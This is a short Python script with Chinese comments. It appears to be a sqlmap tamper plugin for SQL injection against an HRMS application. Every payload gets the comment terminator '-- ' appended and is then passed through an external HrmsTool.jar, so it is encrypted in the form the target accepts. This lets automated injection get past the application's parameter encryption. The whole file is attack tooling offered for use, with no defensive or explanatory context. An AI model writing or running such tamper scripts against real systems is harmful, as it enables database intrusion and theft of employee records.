#!/usr/bin/env python

import subprocess
import sys

class HrmsToolTamper:
    def __init__(self, java_path, hrms_tool_path):
        self.java_path = java_path
        self.hrms_tool_path = hrms_tool_path

    def encrypt_payload(self, payload):
        # 构建 Java 命令
        command = [self.java_path, "-jar", self.hrms_tool_path, "-e", payload]

        try:
            # 调用 HrmsTool.jar 并捕获输出
            result = subprocess.check_output(command)
            output = result.decode().strip()

            # 提取 safe-encode: 后到 encrypt: 前的内容作为 payload
            start_index = output.find("safe-encode:") + len("safe-encode:")
            end_index = output.find("encrypt:")
            encrypted_payload = output[start_index:end_index].strip()

            return encrypted_payload
        except subprocess.CalledProcessError:
            # 处理调用过程中的错误
            return None

    def tamper(self, payload, **kwargs):
        # 在 payload 尾部加上 '-- '
        payload += "-- "

        encrypted_payload = self.encrypt_payload(payload)

        if encrypted_payload is not None:
            # 构造 tampered_payload
            tampered_payload = encrypted_payload

            return tampered_payload

        # 如果加密过程出错，则返回原始的 payload
        return payload

def tamper(payload, **kwargs):
    #java环境（java 1.8）
    java_path = r"path to\java.exe"
    #HrmsTool路径
    hrms_tool_path = r"path to\HrmsTool.jar"

    tamper_obj = HrmsToolTamper(java_path, hrms_tool_path)

    try:
        tampered_payload = tamper_obj.tamper(payload)

        # 将加密后的 payload 输出
        return tampered_payload
    except Exception as e:
        # 处理异常情况
        raise e
